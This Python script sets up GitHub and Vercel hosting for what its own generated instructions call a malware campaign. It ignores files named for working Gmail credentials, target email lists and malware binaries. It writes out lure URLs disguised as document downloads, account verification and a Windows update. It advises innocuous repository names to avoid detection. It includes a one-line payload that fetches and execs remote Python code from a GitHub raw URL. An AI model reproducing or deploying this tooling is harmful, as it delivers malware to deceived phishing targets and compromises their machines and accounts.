#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GitHub Deployment Script
Automates the process of creating and deploying to GitHub
"""

import os
import subprocess
import json
import time

def run_command(command, description):
    """Run a command and handle errors"""
    print(f"🔄 {description}...")
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"✓ {description} completed successfully")
            return True
        else:
            print(f"✗ {description} failed: {result.stderr}")
            return False
    except Exception as e:
        print(f"✗ {description} failed: {e}")
        return False

def create_gitignore():
    """Create .gitignore file"""
    gitignore_content = """
# Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
build/
develop-eggs/
dist/
downloads/
eggs/
.eggs/
lib/
lib64/
parts/
sdist/
var/
wheels/
*.egg-info/
.installed.cfg
*.egg

# Virtual environments
venv/
env/
ENV/

# IDE
.vscode/
.idea/
*.swp
*.swo

# OS
.DS_Store
Thumbs.db

# Logs
*.log
campaign_logs/
gmail_working_credentials.txt
target_emails.txt

# Malware files (keep private)
malware/
*.exe
*.bat
*.ps1
*.vbs
app.py
"""
    
    with open(".gitignore", 'w') as f:
        f.write(gitignore_content)
    
    print("✓ Created .gitignore file")

def create_package_json():
    """Create package.json for Vercel"""
    package_json = {
        "name": "techcorp-portal",
        "version": "1.0.0",
        "description": "TechCorp Solutions Portal",
        "main": "api/index.py",
        "scripts": {
            "start": "python api/index.py"
        },
        "keywords": ["portal", "business", "solutions"],
        "author": "TechCorp Solutions",
        "license": "MIT"
    }
    
    with open("package.json", 'w') as f:
        json.dump(package_json, f, indent=2)
    
    print("✓ Created package.json file")

def setup_git_repository():
    """Initialize git repository and make initial commit"""
    commands = [
        ("git init", "Initializing git repository"),
        ("git add .", "Adding files to git"),
        ("git commit -m 'Initial commit: TechCorp Portal'", "Making initial commit")
    ]
    
    for command, description in commands:
        if not run_command(command, description):
            return False
    
    return True

def create_deployment_instructions():
    """Create deployment instructions"""
    instructions = """
# 🚀 DEPLOYMENT INSTRUCTIONS

## Step 1: GitHub Repository Ready

✅ Repository already exists: https://github.com/Wwb-Daniel/Gmail

## Step 2: Connect Local Repository

Run these commands in your terminal:

```bash
git remote add origin https://github.com/Wwb-Daniel/Gmail.git
git branch -M main
git push -u origin main
```

## Step 3: Deploy to Vercel

1. Go to https://vercel.com
2. Sign up/Login with GitHub
3. Click "New Project"
4. Import your `techcorp-portal` repository
5. Deploy (no configuration needed)

## Step 4: Get Your URL

After deployment, you'll get a URL like:
`https://techcorp-portal.vercel.app`

## Step 5: Update Campaign

1. Edit `vercel_campaign.py`
2. Replace `YOUR_PROJECT_NAME` with your actual Vercel URL
3. Run: `python vercel_campaign.py`

## 🎯 Your Malware URLs Will Be:

- https://YOUR_PROJECT.vercel.app/download/project-document-2024
- https://YOUR_PROJECT.vercel.app/verify/account-verification
- https://YOUR_PROJECT.vercel.app/update/KB5001234

## ⚠️ Important Notes:

- Keep GitHub repository PRIVATE
- Use innocent repository names
- Don't use obvious malware-related names
- The malware payload will download from your GitHub repository

## 🔧 Customization:

Edit `api/index.py` and change this line:
```python
python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/USERNAME/REPO/main/app.py').read())"
```

Replace `USERNAME/REPO` with your actual GitHub username and repository name.
"""
    
    with open("DEPLOYMENT_INSTRUCTIONS.md", 'w', encoding='utf-8') as f:
        f.write(instructions)
    
    print("✓ Created deployment instructions")

def main():
    """Main deployment function"""
    print("="*60)
    print("🚀 GITHUB DEPLOYMENT SETUP")
    print("="*60)
    print("This script will prepare your files for GitHub deployment")
    print("="*60)
    
    # Check if git is installed
    if not run_command("git --version", "Checking git installation"):
        print("✗ Git is not installed. Please install git first.")
        return
    
    # Create necessary files
    create_gitignore()
    create_package_json()
    create_deployment_instructions()
    
    # Setup git repository
    if setup_git_repository():
        print("\n" + "="*60)
        print("✅ GITHUB SETUP COMPLETED!")
        print("="*60)
        print("Next steps:")
        print("1. Create a GitHub repository (PRIVATE)")
        print("2. Connect your local repository")
        print("3. Deploy to Vercel")
        print("4. Update vercel_campaign.py with your URL")
        print("5. Run the campaign")
        print("="*60)
        print("📖 See DEPLOYMENT_INSTRUCTIONS.md for detailed steps")
    else:
        print("\n✗ Setup failed. Please check the errors above.")

if __name__ == "__main__":
    main()
